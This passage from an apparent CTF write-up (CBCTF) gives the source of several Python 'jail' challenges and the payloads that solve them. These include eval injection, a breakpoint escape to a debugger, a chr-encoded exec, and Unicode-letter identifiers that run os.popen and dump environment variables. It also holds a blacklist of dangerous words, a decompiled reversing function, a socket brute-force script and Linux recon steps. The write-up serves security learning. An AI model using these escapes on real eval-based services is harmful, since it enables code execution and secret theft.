class="string">&quot;It&#x27;s too long to eval&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Result: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">eval</span>(input_data)))</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Result: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="built_in">eval</span>(<span class="built_in">input</span>())</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).getenv(<span class="string">&#x27;FLAG&#x27;</span>)</span><br><span class="line">Result: CBCTF&#123;oOo_FxXK_THIs-1SsS-NOt-SeCURe&#125;</span><br></pre></td></tr></table></figure>
<p>py_jail 4</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">WELCOME = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"> _     _______     _______ _       _  _   </span></span><br><span class="line"><span class="string">| |   | ____\ \   / / ____| |     | || |  </span></span><br><span class="line"><span class="string">| |   |  _|  \ \ / /|  _| | |     | || |_ </span></span><br><span class="line"><span class="string">| |___| |___  \ V / | |___| |___  |__   _|</span></span><br><span class="line"><span class="string">|_____|_____|  \_/  |_____|_____|    |_|  </span></span><br><span class="line"><span class="string">                                          </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(WELCOME)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to the JBNRZ&#x27;s pyjail&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;I&#x27;m just a calculator, hhhhhh.\nI believe shorter is more secure!&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Example: &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;  input: 1 + 1&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;  Result: 2&quot;</span>)</span><br><span class="line">input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(input_data) &gt; <span class="number">12</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;It&#x27;s too long to eval&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Result: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">eval</span>(input_data)))</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Result: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">breakpoint</span>()</span><br><span class="line">--Return--</span><br><span class="line">&lt;string&gt;(<span class="number">1</span>)&lt;module&gt;()-&gt;<span class="literal">None</span></span><br><span class="line">(Pdb) !<span class="keyword">import</span> os; <span class="built_in">print</span>(os.getenv(<span class="string">&#x27;FLAG&#x27;</span>))</span><br><span class="line">CBCTF&#123;OK-You_aRe_bRe@kPoInT_maStEr&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>py_jail5</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">WELCOME = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"> _     _______     _______ _       ____  </span></span><br><span class="line"><span class="string">| |   | ____\ \   / / ____| |     | ___| </span></span><br><span class="line"><span class="string">| |   |  _|  \ \ / /|  _| | |     |___ \ </span></span><br><span class="line"><span class="string">| |___| |___  \ V / | |___| |___   ___) |</span></span><br><span class="line"><span class="string">|_____|_____|  \_/  |_____|_____| |____/ </span></span><br><span class="line"><span class="string">                                         </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">black = [<span class="string">&quot;input&quot;</span>, <span class="string">&quot;import&quot;</span>, <span class="string">&quot;os&quot;</span>, <span class="string">&quot;open&quot;</span>, <span class="string">&quot;popen&quot;</span>, <span class="string">&quot;system&quot;</span>, <span class="string">&quot;read&quot;</span>, <span class="string">&quot;breakpoint&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;\&quot;&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(WELCOME)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to the JBNRZ&#x27;s pyjail&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;I&#x27;m just a calculator, hhhhhh.\nI banned some dangerous words!&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Example: &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;  input: 1 + 1&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;  Result: 2&quot;</span>)</span><br><span class="line">input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">any</span>([i <span class="keyword">in</span> input_data <span class="keyword">for</span> i <span class="keyword">in</span> black]):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Ohhhh, what are you doing???!!!&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Result: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">eval</span>(input_data)))</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Result: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="built_in">str</span>().join(<span class="built_in">map</span>(<span class="built_in">chr</span>,[<span class="number">105</span>,<span class="number">109</span>,<span class="number">112</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">32</span>,<span class="number">111</span>,<span class="number">115</span>,<span class="number">59</span>,<span class="number">112</span>,<span class="number">114</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">116</span>,<span class="number">40</span>,<span class="number">111</span>,<span class="number">115</span>,<span class="number">46</span>,<span class="number">103</span>,<span class="number">101</span>,<span class="number">116</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">118</span>,<span class="number">40</span>,<span class="number">34</span>,<span class="number">70</span>,<span class="number">76</span>,<span class="number">65</span>,<span class="number">71</span>,<span class="number">34</span>,<span class="number">41</span>,<span class="number">41</span>])))</span><br><span class="line">CBCTF&#123;nOoOOoo-You-bREak_MmY_jAil&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>py_jail6</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> ascii_letters</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">WELCOME = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"> _     _______     _______ _        __   </span></span><br><span class="line"><span class="string">| |   | ____\ \   / / ____| |      / /_  </span></span><br><span class="line"><span class="string">| |   |  _|  \ \ / /|  _| | |     | &#x27;_ \ </span></span><br><span class="line"><span class="string">| |___| |___  \ V / | |___| |___  | (_) |</span></span><br><span class="line"><span class="string">|_____|_____|  \_/  |_____|_____|  \___/ </span></span><br><span class="line"><span class="string">                                         </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(WELCOME)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to the JBNRZ&#x27;s pyjail&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;I&#x27;m just a calculator, hhhhhh.\nYou can not use any letters!&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Example: &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;  input: 1 + 1&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;  Result: 2&quot;</span>)</span><br><span class="line">input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">any</span>([i <span class="keyword">in</span> ascii_letters <span class="keyword">for</span> i <span class="keyword">in</span> input_data]):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Ohhhh, what are you doing???!!!&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Result: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">eval</span>(input_data)))</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Result: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&gt; __𝑖𝑚𝑝𝑜𝑟𝑡__(<span class="string">&#x27;\157\163&#x27;</span>).𝑝𝑜𝑝𝑒𝑛(<span class="string">&#x27;\145\156\166&#x27;</span>).𝑟𝑒𝑎𝑑()</span><br><span class="line">Result: KUBERNETES_SERVICE_PORT=443</span><br><span class="line">KUBERNETES_PORT=tcp://10.43.0.1:443</span><br><span class="line">REMOTE_HOST=100.64.0.4</span><br><span class="line">HOSTNAME=pod-0af3eb6e4f0e875378b7</span><br><span class="line">HOME=/root</span><br><span class="line">LC_CTYPE=C.UTF-8</span><br><span class="line">KUBERNETES_PORT_443_TCP_ADDR=10.43.0.1</span><br><span class="line">PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line">KUBERNETES_PORT_443_TCP_PORT=443</span><br><span class="line">KUBERNETES_PORT_443_TCP_PROTO=tcp</span><br><span class="line">KUBERNETES_SERVICE_PORT_HTTPS=443</span><br><span class="line">KUBERNETES_PORT_443_TCP=tcp://10.43.0.1:443</span><br><span class="line">KUBERNETES_SERVICE_HOST=10.43.0.1</span><br><span class="line">PWD=/</span><br><span class="line">FLAG=CBCTF&#123;l-ForgEt_ThE_UNlcODE_l3TT3EEERS&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_4011C0</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [esp+14h] [ebp-114h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v7; <span class="comment">// [esp+18h] [ebp-110h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+1Ch] [ebp-10Ch]</span></span><br><span class="line">  LPVOID lpMem; <span class="comment">// [esp+20h] [ebp-108h]</span></span><br><span class="line">  _BYTE v10[<span class="number">256</span>]; <span class="comment">// [esp+24h] [ebp-104h] BYREF</span></span><br><span class="line"></span><br><span class="line">  sub_401440(aEnterInput);</span><br><span class="line">  v0 = sub_4059A8(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( sub_405B85(v10, <span class="number">256</span>, v0) )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = sub_4079B0(v10, asc_41E01C);</span><br><span class="line">    <span class="keyword">if</span> ( v6 &gt;= <span class="number">0x100</span> )</span><br><span class="line">      sub_40159D();</span><br><span class="line">    v10[v6] = <span class="number">0</span>;</span><br><span class="line">    v7 = <span class="number">0</span>;</span><br><span class="line">    v3 = sub_407A00(v10);</span><br><span class="line">    lpMem = (LPVOID)sub_401000((<span class="type">int</span>)v10, v3, &amp;v7);</span><br><span class="line">    <span class="keyword">if</span> ( lpMem )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v7; ++i )</span><br><span class="line">        *((_BYTE *)lpMem + i) ^= <span class="number">0x16u</span>;</span><br><span class="line">      v5 = sub_407A00(aFuxnfbQxrXeFLq);</span><br><span class="line">      <span class="keyword">if</span> ( v7 != v5 || sub_4021DB(lpMem, aFuxnfbQxrXeFLq, v7) )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_401440(aFail);</span><br><span class="line">        sub_401440(a99s);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        sub_401440(aSuccess);</span><br><span class="line">      &#125;</span><br><span class="line">      sub_407990(lpMem);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v4 = sub_4059A8(<span class="number">2</span>);</span><br><span class="line">      sub_401400(v4, aMemoryError);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = sub_4059A8(<span class="number">2</span>);</span><br><span class="line">    sub_401400(v1, aReadError);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a><strong>Linux</strong></h2><ul>
<li>GuessWhat</li>
</ul>
<blockquote>
<p>来和猜猜超～大～的数字吧</p>
</blockquote>
<p>打开容器，巨大无比的数字，问ai发现是2^1024-1</p>
<p>二分法吧</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;101.37.152.107&quot;</span></span><br><span class="line">port = <span class="number">51899</span></span><br><span class="line"></span><br><span class="line">s = socket.socket()</span><br><span class="line">s.connect((host, port))</span><br><span class="line">s.settimeout(<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;欢迎信息:&quot;</span>, s.recv(<span class="number">4096</span>).decode().strip())</span><br><span class="line"></span><br><span class="line">low=<span class="number">1</span></span><br><span class="line">high=<span class="number">179769313486231590772930519078902473361797697894230657273430081157732675805500963132708477322407536021120113879871393357658789768814416622492847430639474124377767893424865485276302219601246094119453082952085005768838150682342462881473913110540827237163350510684586298239947245938479716304835356329624224137215</span></span><br><span class="line"></span><br><span class="line">prompt_bytes = <span class="string">&quot;输入一个数字:&quot;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1024</span>):</span><br><span class="line">    mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n尝试 <span class="subst">&#123;i&#125;</span>: <span class="subst">&#123;mid&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 发送猜测</span></span><br><span class="line">    guess_str = <span class="built_in">str</span>(mid) + <span class="string">&quot;\n&quot;</span></span><br><span class="line">    s.send(guess_str.encode())</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 尝试读取，允许重试</span></span><br><span class="line">    max_retries = <span class="number">3</span></span><br><span class="line">    resp_text = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> retry <span class="keyword">in</span> <span class="built_in">range</span>(max_retries):</span><br><span class="line">        resp = <span class="string">b&quot;&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            chunk = s.recv(<span class="number">4096</span>)</span><br><span class="line">            time.sleep(<span class="number">0.2</span>)  <span class="comment"># 等待更长时间</span></span><br><span class="line">            <span class="keyword">while</span> chunk:</span><br><span class="line">                resp += chunk</span><br><span class="line">                <span class="keyword">if</span> prompt_bytes <span class="keyword">in</span> resp:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    chunk = s.recv(<span class="number">4096</span>)</span><br><span class="line">                <span class="keyword">except</span> socket.timeout:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> socket.timeout:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;  读取超时 (重试 <span class="subst">&#123;retry+<span class="number">1</span>&#125;</span>/<span class="subst">&#123;max_retries&#125;</span>)&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">        resp_text = resp.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;  原始响应: <span class="subst">&#123;<span class="built_in">repr</span>(resp_text)&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 如果响应包含大小提示，就跳出重试循环</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;猜得太&quot;</span> <span class="keyword">in</span> resp_text <span class="keyword">or</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> resp_text.lower() <span class="keyword">or</span> <span class="string">&quot;正确&quot;</span> <span class="keyword">in</span> resp_text <span class="keyword">or</span> <span class="string">&quot;恭喜&quot;</span> <span class="keyword">in</span> resp_text:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> retry &lt; max_retries - <span class="number">1</span>:</span><br><span class="line">            <span class="comment"># 没收到有效响应，重新发送相同的猜测</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;  未收到大小提示，重新发送...&quot;</span>)</span><br><span class="line">            s.send(guess_str.encode())</span><br><span class="line">            time.sleep(<span class="number">0.3</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 处理响应</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;猜得太小了&quot;</span> <span class="keyword">in</span> resp_text:</span><br><span class="line">        low = mid + <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;-&gt; 太小&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;猜得太大了&quot;</span> <span class="keyword">in</span> resp_text:</span><br><span class="line">        high = mid - <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;-&gt; 太大&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> resp_text.lower() <span class="keyword">or</span> <span class="string">&quot;正确&quot;</span> <span class="keyword">in</span> resp_text <span class="keyword">or</span> <span class="string">&quot;恭喜&quot;</span> <span class="keyword">in</span> resp_text <span class="keyword">or</span> <span class="string">&quot;成功&quot;</span> <span class="keyword">in</span> resp_text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;成功！答案可能是:&quot;</span>, mid)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;完整响应:&quot;</span>, resp_text)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;格式有误&quot;</span> <span class="keyword">in</span> resp_text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;格式错误，停止&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;输入一个数字:&quot;</span> <span class="keyword">in</span> resp_text <span class="keyword">and</span> (<span class="string">&quot;猜得太&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> resp_text):</span><br><span class="line">        <span class="comment"># 只有提示，没有大小判断</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;没有大小判断，可能游戏结束或连接异常&quot;</span>)</span><br><span class="line">        <span class="comment"># 尝试继续，但可能无效</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;未知响应，继续尝试...&quot;</span>)</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n最终范围:&quot;</span>, low, <span class="string">&quot;到&quot;</span>, high)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">尝试 1022: 97840730776542341231693997877036791705381503372002052240864442189704334444583757102752029803417588499983466888360411211033468663597999986423581319971031300244738035685925678531286296576852108117779042109204420792505995413370369016448014261587879061078527642363379087098954032685672485058950496553457395585806</span><br><span class="line">  原始响应: &#x27;猜对啦！\nflag=CBCTF&#123;PwntOOOo0l5-I5_SUcH-a_PoWERFUl_to0l&#125;\n\n&#x27;</span><br><span class="line">成功！答案可能是: 97840730776542341231693997877036791705381503372002052240864442189704334444583757102752029803417588499983466888360411211033468663597999986423581319971031300244738035685925678531286296576852108117779042109204420792505995413370369016448014261587879061078527642363379087098954032685672485058950496553457395585806</span><br><span class="line">完整响应: 猜对啦！</span><br><span class="line">flag=CBCTF&#123;PwntOOOo0l5-I5_SUcH-a_PoWERFUl_to0l&#125;</span><br><span class="line"></span><br><span class="line">最终范围: 97840730776542341231693997877036791705381503372002052240864442189704334444583757102752029803417588499983466888360411211033468663597999986423581319971031300244738035685925678531286296576852108117779042109204420792505995413370369016448014261587879061078527642363379087098954032685672485058950496553457395585805 到 97840730776542341231693997877036791705381503372002052240864442189704334444583757102752029803417588499983466888360411211033468663597999986423581319971031300244738035685925678531286296576852108117779042109204420792505995413370369016448014261587879061078527642363379087098954032685672485058950496553457395585807</span><br></pre></td></tr></table></figure>
<p><strong>CBCTF{PwntOOOo0l5-I5_SUcH-a_PoWERFUl_to0l}</strong></p>
<ul>
<li>I use Debian btw</li>
</ul>
<blockquote>
<p>恭喜你拿到了一台debian机器的shell！请你做一些信息收集，然后完善一下基础设施吧～</p>
<p>使用telnet连接端口哦</p>
</blockquote>
<p>连接一下，ai提示说一般有checkme程序</p>
<p>拿到一台机器，首先要检查一下系统信息，这台机器的发行版完整名字是(PRETTY_NAME)？</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ctf@pod-2a9e39db8abecac116e2:~$ <span class="built_in">cat</span> /etc/os-release | grep PRETTY_NAME</span><br><span class="line">PRETTY_NAME=<span class="string">&quot;Debian GNU/Linux 13 (trixie)&quot;</span></span><br></pre></td></tr></table></figure>
<p>ctf用户的权限是多少(UID)？</p>
